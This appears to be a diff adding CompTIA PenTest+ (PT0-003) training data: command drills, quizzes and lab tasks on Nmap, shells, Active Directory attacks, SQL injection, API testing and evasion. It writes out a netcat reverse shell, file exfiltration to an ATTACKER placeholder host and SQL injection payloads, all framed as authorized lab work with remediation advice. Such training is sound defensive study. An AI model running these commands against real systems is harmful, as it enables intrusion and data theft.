@@ -1,0 +1,512 @@
+#D 21|2 Recon|Nmap NSE and deep enumeration|Master the Nmap Scripting Engine for authorized enumeration.
+C Run the default safe scripts against a host to gather extra detail.
+A nmap -sC 192.168.56.10
+A nmap --script=default 192.168.56.10
+E -sC runs the "default" category NSE scripts; safe, informative, authorized targets only.
+C List all HTTP-related NSE scripts available on your system.
+A ls /usr/share/nmap/scripts/ | grep http
+A nmap --script-help 'http-*'
+E NSE scripts live in /usr/share/nmap/scripts/; there are hundreds by category.
+C Enumerate HTTP methods and title on a web host.
+A nmap --script http-methods,http-title -p80,443 192.168.56.10
+E Dangerous methods like PUT/DELETE being allowed is a finding.
+C Enumerate SMB shares, users and OS in one command.
+A nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 192.168.56.10
+E Authorized targets only; note anonymous/guest access.
+C Check for anonymous FTP login with NSE.
+A nmap -p21 --script ftp-anon 192.168.56.10
+E Anonymous FTP that exposes files is a reportable finding.
+Q Which NSE category should you AVOID on fragile production without explicit permission?
++ intrusive / dos
+- default
+- safe
+- discovery
+E Intrusive and dos scripts can disrupt services.
+Q What does the -oA flag do?
++ Saves output in all three formats (normal, XML, grepable) with one base name
+- Runs all scripts
+- Scans all ports
+- Enables OS detection
+E -oA basename produces basename.nmap/.xml/.gnmap for later parsing and diffing.
+Q How do you scan every TCP port, not just the common ones?
++ Use -p- (ports 1-65535)
+- Use -F
+- Use --top-ports 10
+- Use -sn
+E -F is fast/fewer ports; -p- is exhaustive but slower.
+T Full NSE enumeration sweep (authorized lab)
+S On a lab host, run a service scan with default scripts on all ports, save all output formats, and list the three most interesting findings.
+X nmap -sS -sV -sC -p- -oA fullscan 192.168.56.10
+X grep -iE 'open|http-title|smb|ftp-anon' fullscan.nmap | head
+V you can name three actionable findings from one scan
+T Targeted NSE per service
+S For each open service on a lab host, pick and run the most relevant NSE script and record the result.
+X nmap -p80 --script http-enum 192.168.56.10
+X nmap -p445 --script smb-enum-shares 192.168.56.10
+X nmap -p3306 --script mysql-info 192.168.56.10
+V each service has an enumeration result recorded
+T Parse scan output
+S Turn a saved grepable scan into a clean list of "ip:port service" for the report.
+X nmap -sV -oG services.gnmap 192.168.56.0/24
+X grep -oE '[0-9.]+.*open' services.gnmap | head
+X awk '/open/{print $2}' services.gnmap | sort -u
+V you produced a tidy host/service inventory
+T Build your own recon script
+S Write a bash script that takes an IP and runs host discovery, a version scan, and default scripts, saving each stage.
+X printf '#!/bin/bash\nt=$1\nnmap -sn $t -oN ping.txt\nnmap -sV -oN ver.txt $t\nnmap -sC -oN scripts.txt $t\n' > recon.sh
+X chmod +x recon.sh && ./recon.sh 192.168.56.10
+V one command produces a staged recon of a host
+
+#D 22|4 Exploitation|Manual exploitation and shells|Exploit without a framework and manage shells on authorized targets.
+C Start a Netcat listener on port 4444 for a reverse shell (authorized lab).
+A nc -lvnp 4444
+A ncat -lvnp 4444
+E -l listen, -v verbose, -n no DNS, -p port. Your attacker VM waits for the callback.
+C Connect out from a target to your listener to get a bind/reverse shell (lab).
+A nc 192.168.56.5 4444 -e /bin/bash
+E Authorized lab targets only; -e runs a shell over the connection.
+C Upgrade a dumb shell to a fully interactive TTY (Python method).
+A python3 -c 'import pty;pty.spawn("/bin/bash")'
+E Then background with Ctrl+Z and run `stty raw -echo; fg` for a proper TTY.
+C Transfer a file to a target with a simple HTTP server.
+A python3 -m http.server 8000
+E On the target: `wget http://ATTACKER:8000/file` or `curl -O ...` (authorized lab).
+C Search Exploit-DB from the command line for a service.
+A searchsploit vsftpd 2.3.4
+E searchsploit indexes Exploit-DB locally; read/verify any PoC before use.
+Q Why upgrade a "dumb" shell to a full TTY?
++ To get job control, tab completion, and run interactive tools reliably
+- To encrypt it
+- To make it faster only
+- It is not needed
+E A raw shell breaks on interactive prompts and Ctrl+C.
+Q A bind shell vs a reverse shell: a reverse shell:
++ Connects from the target back to the attacker (good when inbound is blocked)
+- Listens on the target for the attacker
+- Encrypts nothing
+- Is the same thing
+E Reverse shells traverse many firewalls that block inbound.
+Q Before running a public PoC exploit, you should:
++ Read and understand what it does, and test in a lab first
+- Run it blindly on production
+- Skip authorization
+- Disable logging
+E Untrusted exploit code can be destructive or backdoored.
+T Get and stabilize a shell (authorized lab)
+S On a vulnerable lab VM, obtain a reverse shell and upgrade it to a full interactive TTY.
+X # attacker: nc -lvnp 4444
+X # trigger the callback from the lab target (via the vuln)
+X python3 -c 'import pty;pty.spawn("/bin/bash")'
+X # Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm
+V you have a stable, interactive shell in the lab
+T File transfer both ways
+S Move a file from attacker to target and back, using two different methods.
+X python3 -m http.server 8000        # attacker serves
+X # target: wget http://ATTACKER:8000/tool ; chmod +x tool
+X # back: nc -lvnp 9001 > out.bin (attacker) ; nc ATTACKER 9001 < loot (target)
+V you moved files in both directions in the lab
+T Find and vet an exploit
+S For a known-vulnerable service version, find a candidate exploit and describe how you would vet it before running.
+X searchsploit <service> <version>
+X searchsploit -x <path>       # read the exploit source
+X # vet: understand payload/impact, test in an isolated lab, never blind-run
+V you can explain what the exploit does before running it
+T Manual web exploitation with curl
+S Interact with a vulnerable lab endpoint using curl to demonstrate an issue without a browser.
+X curl -s 'http://192.168.56.10/api/user?id=1'
+X curl -s 'http://192.168.56.10/api/user?id=2'   # IDOR check
+X curl -s -X POST -d "q=' OR '1'='1" http://192.168.56.10/search   # SQLi check (lab)
+V you demonstrated a web flaw purely from the command line
+
+#D 23|5 Post-exploit|Active Directory attacks|Test Windows domain security on authorized networks.
+Q Active Directory is a high-value target because:
++ Compromising it can grant control over the entire Windows domain
+- It only stores wallpapers
+- It is never networked
+- It has no privileges
+E Domain compromise = access to most corporate resources.
+Q "Kerberoasting" abuses:
++ Service accounts' Kerberos tickets, which can be cracked offline for their passwords
+- DNS caching
+- TLS certificates
+- The firewall
+E Use strong, long service-account passwords (or gMSA) to defend.
+Q "AS-REP roasting" targets accounts that:
++ Have Kerberos pre-authentication disabled, allowing offline crackable material
+- Use MFA
+- Are disabled
+- Have long passwords
+E Enable pre-authentication; use strong passwords.
+Q "BloodHound" is used to:
++ Map AD relationships to find attack paths to Domain Admin
+- Crack Wi-Fi
+- Scan the internet
+- Encrypt disks
+E It visualizes who-can-reach-what, exposing privilege paths.
+Q "Pass-the-ticket" reuses:
++ Kerberos tickets to authenticate as a user without their password
+- A password hash only
+- A TLS cert
+- Nothing
+E Ticket hygiene and monitoring help detect it.
+Q A "golden ticket" attack forges:
++ A Kerberos TGT using the krbtgt hash, granting broad, persistent domain access
+- A TLS certificate
+- A password reset link
+- A DNS record
+E Rotating the krbtgt password (twice) invalidates forged tickets.
+Q The strongest AD defenses a tester recommends include:
++ Tiered admin model, LAPS, strong service-account passwords, MFA, and monitoring
+- One shared admin password
+- Disabling logging
+- Flat network
+E Reduce privilege paths and reusable credentials.
+Q Why must AD testing stay strictly authorized and scoped?
++ Domain-wide actions can disrupt the whole organization
+- AD is public
+- It never affects users
+- Scope does not apply
+E Coordinate carefully; some techniques are noisy or risky.
+C Enumerate domain users from an authorized AD test host (example tool).
+A enum4linux -a 192.168.56.20
+E Also: `nmap -p389 --script ldap-search`. Authorized domain targets only.
+T Enumerate an AD lab (authorized)
+S On an authorized AD lab, enumerate domain, users, and shares, and note one privilege path idea.
+X enum4linux -a 192.168.56.20 | tee ad-enum.txt
+X nmap -p389 --script ldap-rootdse 192.168.56.20
+X # note a service account (SPN) or a group with excessive rights
+V you have domain info and a candidate attack path
+T Kerberoast in a lab (concept + steps)
+S Describe the Kerberoasting steps against an authorized lab and the remediation.
+X # request service tickets for accounts with SPNs
+X # extract the crackable ticket material; crack offline with hashcat/john
+X # remediation: 25+ char service-account passwords or gMSA; monitor TGS requests
+V you can explain the attack and give a real fix
+T AD defense recommendations
+S List five AD hardening recommendations from your test.
+X # tiered admin (separate DA accounts, no daily use)
+X # LAPS for local admin; strong/gMSA service accounts
+X # MFA on admin + VPN; disable legacy protocols
+X # monitor for Kerberoasting/DCSync; rotate krbtgt periodically
+V each maps to an attack technique
+T Map paths with BloodHound (concept)
+S Explain what data BloodHound collects and how you would use the graph to reach Domain Admin.
+X # collects sessions, group memberships, ACLs, trusts
+X # find shortest path from your foothold user to Domain Admins
+X # target the weakest edge (e.g., a user who can reset a DA's password)
+V you can describe reading an attack-path graph
+
+#D 24|4 Exploitation|Scripting and automation for testers|Automate repetitive tasks safely and efficiently.
+C Loop over a list of IPs and ping each (host discovery script).
+A for ip in $(cat targets.txt); do ping -c1 -W1 $ip >/dev/null && echo "$ip up"; done
+E A simple sweep; keep it to in-scope targets only.
+C Extract all IP addresses from a file with grep.
+A grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' scan.txt | sort -u
+E Useful for parsing scan output into a clean target list.
+C Base64-decode a captured string on the command line.
+A echo 'aGVsbG8=' | base64 -d
+E Attackers often encode payloads/data; decoding is routine analysis.
+C URL-encode a payload for a web request (python one-liner).
+A python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "test payload"
+E Handy for crafting web requests by hand.
+C Run a quick port check on a host without nmap (bash /dev/tcp).
+A bash -c 'echo > /dev/tcp/192.168.56.10/22 && echo open'
+E A no-tools way to test a single port; authorized targets only.
+Q Why automate recon and parsing tasks?
++ Consistency, speed, and fewer manual errors across many targets
+- To remove authorization
+- To hide activity
+- It is slower
+E Scripts turn a repeatable process into one command.
+Q A risk of automation in testing is:
++ A buggy script can hit out-of-scope hosts or cause load at scale
+- Nothing
+- It is always safe
+- It cannot fail
+E Add scope checks and rate limits; test scripts first.
+Q Why keep tooling output structured (JSON/CSV/XML)?
++ It is easy to parse, diff, and feed into the report
+- It looks nicer only
+- It is required by law
+- It hides data
+E Machine-readable output enables automation and comparison.
+T Build a target-parsing pipeline
+S From a raw nmap file, extract only hosts with port 445 open into smb_targets.txt.
+X nmap -p445 --open -oG smb.gnmap 192.168.56.0/24
+X awk '/445\/open/{print $2}' smb.gnmap | sort -u > smb_targets.txt
+X cat smb_targets.txt
+V you have a clean list of SMB hosts to enumerate
+T Write a scoped sweep script
+S Write a script that reads targets.txt, refuses any IP not in an allowed CIDR, and version-scans the rest.
+X # pseudo: for ip in targets; do in_scope $ip && nmap -sV $ip; done
+X # in_scope checks the IP against the authorized CIDR before scanning
+V out-of-scope IPs are skipped automatically
+T Decode and analyze
+S Given a base64 + URL-encoded blob from a capture, decode it step by step and describe the content.
+X echo '<blob>' | base64 -d | python3 -c 'import urllib.parse,sys;print(urllib.parse.unquote(sys.stdin.read()))'
+V you recovered and can describe the original content
+T Automate evidence collection
+S Write a script that timestamps and saves the output of id, ss, ps, and sudo -l on a foothold for the report.
+X printf '#!/bin/bash\nd=$(date +%%F-%%H%%M)\n{ date; id; sudo -l; ss -tulpn; ps aux; } > evidence-$d.txt 2>&1\n' > collect.sh
+X chmod +x collect.sh && ./collect.sh
+V one command captures timestamped evidence
+
+#D 25|4 Exploitation|Attacking databases and APIs|Test data stores and web APIs on authorized systems.
+C Connect to a MySQL server with provided lab credentials.
+A mysql -h 192.168.56.10 -u root -p
+E Authorized lab only; weak/default DB creds are a common finding.
+C Test a REST API endpoint with curl and view headers.
+A curl -i http://192.168.56.10:8080/api/health
+E -i shows status and headers; look for verbose errors and missing auth.
+C Send a JSON POST to an API endpoint (lab).
+A curl -s -X POST -H 'Content-Type: application/json' -d '{"user":"a"}' http://192.168.56.10:8080/api/login
+E Test auth, input handling, and error messages.
+C Enumerate database names once connected (MySQL).
+A SHOW DATABASES;
+E Then SHOW TABLES; and inspect for sensitive data (authorized).
+Q An API returning full stack traces on error is a finding because:
++ It leaks internal details useful to an attacker
+- It is faster
+- It is encrypted
+- It is required
+E Recommend generic error messages and proper logging.
+Q "Broken object-level authorization" (BOLA/IDOR) in an API means:
++ One user can access another user's objects by changing an ID
+- The API is encrypted
+- Rate limiting is on
+- Input is validated
+E Enforce per-request, per-object authorization checks.
+Q A missing rate limit on an API login enables:
++ Brute-force / credential-stuffing attacks
+- Faster legitimate use only
+- Encryption
+- Nothing
+E Recommend rate limiting, lockout, and MFA.
+Q Why test for default/weak database credentials?
++ They are a frequent, high-impact way into sensitive data
+- They are encrypted
+- They never exist
+- It is not useful
+E root with no/weak password is a classic breach path.
+T Test an API for common issues (authorized lab)
+S On a lab API, check for missing auth, IDOR, and verbose errors, documenting each result.
+X curl -i http://192.168.56.10:8080/api/users        # is auth required?
+X curl -s http://192.168.56.10:8080/api/users/1; echo
+X curl -s http://192.168.56.10:8080/api/users/2; echo   # IDOR?
+X curl -s http://192.168.56.10:8080/api/oops           # error verbosity?
+V you recorded a verdict for auth, IDOR and error handling
+T Assess a database (authorized lab)
+S Connect to a lab database, enumerate its contents, and write the findings and fixes.
+X mysql -h 192.168.56.10 -u root -p
+X # SHOW DATABASES; USE app; SHOW TABLES; SELECT * FROM users LIMIT 5;
+X # findings: weak creds, sensitive data unencrypted at rest
+X # fixes: strong creds, least-privilege DB accounts, encrypt sensitive columns
+V you documented DB findings with remediation
+T API hardening recommendations
+S List five recommendations after finding missing auth, IDOR, and no rate limit.
+X # require authentication + per-object authorization
+X # rate limiting + lockout + MFA on sensitive endpoints
+X # generic error messages; input validation; least-privilege DB user
+V each fixes a specific observed issue
+T SQL injection deep dive (lab)
+S On a deliberately vulnerable lab app, demonstrate extracting a table name via injection, then write the parameterized-query fix.
+X # in a lab input:  ' UNION SELECT table_name,2 FROM information_schema.tables-- -
+X # confirm you can read schema; screenshot
+X # fix: prepared statements; least-privilege DB account; input validation
+V you demonstrated SQLi impact and gave the correct fix
+
+#D 26|4 Exploitation|Evasion awareness and detection|Understand evasion so you can test and improve detection (purple-team).
+Q In an authorized test, understanding evasion helps you:
++ Assess how well the client detects and responds, and recommend improvements
+- Permanently hide from the client
+- Break the law
+- Avoid reporting
+E The goal is better detection, not undetectable attacks.
+Q Why do attackers "live off the land" (LOLBins)?
++ Using built-in tools avoids dropping detectable malware files
+- It is faster only
+- It is encrypted
+- It is required
+E Monitor for abnormal use of legit tools (e.g., PowerShell, certutil).
+Q "Timestomping" refers to:
++ Altering file timestamps to hinder forensic analysis
+- Compressing files
+- Encrypting files
+- Backing up files
+E Defenders compare multiple timestamps and central logs to catch it.
+Q Encoding/obfuscating a payload aims to:
++ Evade signature-based detection
+- Improve performance
+- Encrypt data at rest
+- Nothing
+E Behavior-based detection (EDR) is harder to evade than signatures.
+Q From a purple-team view, when a technique is NOT detected you should:
++ Report the detection gap so the client can add monitoring
+- Keep it secret
+- Exploit it forever
+- Ignore it
+E Undetected TTPs are exactly what the client needs to know.
+Q Why do attackers clear or tamper with logs?
++ To hide their activity and slow response
+- To free disk space
+- To help defenders
+- To speed the system
+E Recommend centralized, immutable/off-host logging.
+Q "Beaconing" traffic to C2 is detectable by:
++ Regular, periodic connections to an unusual destination
+- Encryption alone
+- Faster DNS
+- Nothing
+E Flow analysis and threat intel catch beacon patterns.
+Q The best defensive recommendation after testing evasion is often:
++ Centralized logging + EDR + behavior analytics + alert tuning
+- Turn off logging
+- Trust the endpoint
+- Flat network
+E Detection depth matters more than any single tool.
+T Purple-team detection map
+S For three techniques you used (LOLBins, log tampering, beaconing), write the detection the client should have.
+X # LOLBins -> EDR command-line + parent/child process alerts
+X # log tampering -> central/immutable logs + integrity monitoring
+X # beaconing -> netflow analysis + threat-intel matching
+V each technique has a concrete detection
+T Test whether actions alert (lab)
+S In a monitored lab, run a noisy action and a quiet action; note which triggered detection.
+X # noisy: full port scan of a host
+X # quiet: single connection to one service
+X # check the lab SIEM/EDR for which generated an alert
+V you can state the detection gap
+T Recommend logging improvements
+S After finding local logs were tamperable, write the logging recommendations.
+X # forward logs off-host in real time (central SIEM)
+X # make local logs append-only/immutable where possible
+X # alert on log-clearing events; sync time via NTP
+V an attacker can no longer quietly erase evidence
+
+#D 27|2 Recon|The pentest toolkit|Know the core tools, what they do, and their basic syntax.
+C Version scan with nmap (recon).
+A nmap -sV <target>
+E The go-to network mapper for host/service discovery.
+C Directory brute-force a web app with gobuster.
+A gobuster dir -u http://<target> -w <wordlist>
+E Content discovery to find hidden endpoints.
+C Fuzz web parameters/paths with ffuf.
+A ffuf -u http://<target>/FUZZ -w <wordlist>
+E FUZZ is the injection point; fast and flexible.
+C Crack hashes with hashcat using a wordlist (mode 0 = MD5).
+A hashcat -m 0 hashes.txt <wordlist>
+E GPU-accelerated cracking; pick -m for the hash type.
+C Crack hashes with John the Ripper.
+A john --wordlist=<wordlist> hashes.txt
+E CPU-based; `--show` reveals cracked passwords.
+C Intercept and modify web traffic (tool name).
+A burpsuite
+A zaproxy
+E Burp Suite / OWASP ZAP are the core web proxies for manual testing.
+C Search local Exploit-DB for a keyword.
+A searchsploit <keyword>
+E Read any PoC before use; test in a lab.
+Q Which tool would you use to capture and analyze packets on the wire?
++ Wireshark / tcpdump
+- gobuster
+- hashcat
+- john
+E Packet capture is for traffic analysis, not cracking or fuzzing.
+Q Which tool maps Active Directory attack paths?
++ BloodHound
+- ffuf
+- hashcat
+- nmap
+E BloodHound graphs AD relationships to Domain Admin.
+T Tool-to-task matching
+S For each task, name the primary tool: port scan, web content discovery, hash cracking, packet capture, web request interception, AD path mapping.
+X # port scan -> nmap
+X # web content discovery -> gobuster/ffuf
+X # hash cracking -> hashcat/john
+X # packet capture -> wireshark/tcpdump
+X # web interception -> burp/zap
+X # AD paths -> bloodhound
+V you can pick the right tool instantly
+T Build a one-page cheat sheet
+S Write your own quick-reference of 10 commands you use most, with a one-line note each.
+X nmap -sV -sC -p- -oA scan <t>   # full service+script scan
+X gobuster dir -u http://<t> -w common.txt   # content discovery
+X ffuf -u http://<t>/FUZZ -w common.txt      # fuzz paths/params
+X hashcat -m 0 hashes.txt rockyou.txt        # crack MD5
+X # ...add the rest you rely on
+V you have a personal cheat sheet you can recall under time pressure
+T Chain three tools
+S On an authorized lab, use nmap -> gobuster -> curl to go from open port to a specific vulnerable endpoint.
+X nmap -sV -p80 192.168.56.10
+X gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt -q
+X curl -i http://192.168.56.10/<found-path>
+V you moved from discovery to a concrete endpoint with three tools
+
+#D 28|1 Engagement|Pentest+ exam-day and full practice|Approach PT0-003 and consolidate everything with practice.
+Q PT0-003 includes performance-based questions that require you to:
++ Analyze output, choose/complete commands, or work through a scenario
+- Only pick A-D
+- Write essays
+- Draw diagrams by hand
+E Hands-on command familiarity is exactly what wins PBQ points.
+Q A strong exam strategy for PBQs is to:
++ Flag time-consuming ones, secure the quick multiple-choice points, then return
+- Spend all your time on the first PBQ
+- Skip every PBQ
+- Guess and leave
+E Bank the easy points first; PBQs can consume the clock.
+Q When a question asks for the NEXT step in a methodology, choose:
++ The step that logically follows in the phase order (e.g., enumerate before exploit)
+- The most aggressive action
+- The report step always
+- A random tool
+E Know the phase order cold: recon -> enumerate -> exploit -> post -> report.
+Q Given tool output in a question, the best approach is to:
++ Read the output carefully and pick the action it actually supports
+- Ignore the output
+- Pick the flashiest tool
+- Choose "run a DoS"
+E PBQs reward interpreting real output correctly.
+Q For any scenario, the professional first consideration is:
++ Scope and authorization
+- Which exploit is coolest
+- Speed over safety
+- Skipping the report
+E Staying in scope and authorized is always the right instinct.
+Q The safest answer when two exploits both "work" is usually:
++ The lower-impact one that proves the risk without disrupting the target
+- The most destructive one
+- A DoS
+- Whichever is fastest to type
+E "Do no harm" guides both the exam and the job.
+Q What ties the whole engagement together for the client?
++ A clear, prioritized report with evidence and remediation
+- The number of shells
+- The exploit code alone
+- Raw scanner output
+E Communication and remediation create the real value.
+T Timed methodology drill
+S Take a mixed quiz across all five domains under a mental timer; flag and review only the ones you miss.
+X # Quiz tab -> all domains -> focus on phase order and tool choice
+V you consistently pick the correct next step
+T Full engagement dry run (authorized lab)
+S On a vulnerable lab VM, run a complete mini-engagement: recon, enumeration, exploitation (low-impact PoC), post-exploitation enumeration, cleanup, and a one-page report.
+X nmap -sV -sC -p- -oA engage <lab-ip>
+X gobuster dir -u http://<lab-ip> -w /usr/share/wordlists/dirb/common.txt -q
+X # exploit one confirmed vuln (PoC), get a shell, enumerate, then clean up
+X # write: findings, evidence, impact, remediation
+V you completed all phases and produced a report
+T Command-recall speed round
+S Without notes, write the command for: full port+version scan, web content discovery, hash crack, reverse-shell listener, SUID search, and a pivot proxy.
+X nmap -sS -sV -p- <t>
+X gobuster dir -u http://<t> -w common.txt
+X hashcat -m 0 hashes.txt rockyou.txt
+X nc -lvnp 4444
+X find / -perm -4000 -type f 2>/dev/null
+X ssh -D 1080 user@foothost
+V you recalled every command from memory
+T Weak-spot sweep
+S Use the weak-spots quiz mode until no domain is below 80%, then redo the labs you found hardest.
+X # Quiz -> My weak spots -> repeat
+X # Labs -> redo the two hardest without revealing steps
+V every domain >= 80% and you can do the hard labs unaided
